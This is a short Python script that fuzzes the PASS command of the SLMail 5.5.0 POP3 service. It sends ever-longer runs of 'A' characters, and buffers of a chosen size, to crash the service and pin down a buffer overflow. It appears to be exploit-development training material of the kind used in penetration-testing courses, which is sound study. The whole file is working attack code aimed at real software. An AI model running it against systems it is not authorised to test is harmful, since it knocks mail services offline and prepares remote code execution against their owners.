# This is a python fuzzing script to fuzz the SLMail_5.5.0 client for buffer overflow opportunities
# Use this together with immunity debugger or any debugger of your liking on the target machine

#!/usr/bin/python
import sys
import socket

# Print info about this script in case of bad usage
def printInfo():
    print "-------------------------------------------------------------------------"
    print "Usage  : python " + sys.argv[0] + " <targetIP> (<port>)"
    print "Example: python " + sys.argv[0] + " 10.13.21.44 110\n"

    print "For crash replication"
    print "Usage  : python " + sys.argv[0] + " <targetIP> <port> <buffersize>"
    print "Example: python " + sys.argv[0] + " <targetIP> <port> <bufferSize>"
    print "-------------------------------------------------------------------------"
###



if len(sys.argv) < 3:
    printInfo()
    sys.exit(0)
###

targetIP = sys.argv[1]
port = sys.argv[2]

if len(sys.argv) == 4:
    global buffersize
    bufferSize = sys.argv[3]
###


# The function to actually fuzz the SLMail service until it crashes
# Use this to find out the rough location of the crash
def fuzz():
    buffer = ["A"]
    counter = 100

    while len(buffer) <= 30:
        buffer.append("A" * counter)
        counter = counter + 200
    ###

    for string in buffer:
        print "Fuzzing PASS with %s bytes" %len(string)
        login(string)
    ###
###


# The function to send a buffer of a set size to the service
# Use this function to find the exact location of the crash
def findCrash(bufferSize):
    buffer = "A" * int(bufferSize)

    try:
        print "\nSending evil buffer with %s bytes" %bufferSize
        login(buffer)
    except:
        print "Could not connect to POP3 server!"
###


# The function to actually connect and try to login to the server
def login(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((targetIP, int(port)))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS " + payload + "\r\n")
    s.send("QUIT\r\n")
    s.close()
###


# The main function
def main():
    # Check parameters
    if len(sys.argv) == 3:
        fuzz()
    elif len(sys.argv) == 4:
        findCrash(bufferSize)
    else:
        printInfo()
        sys.exit(0)
###

main()
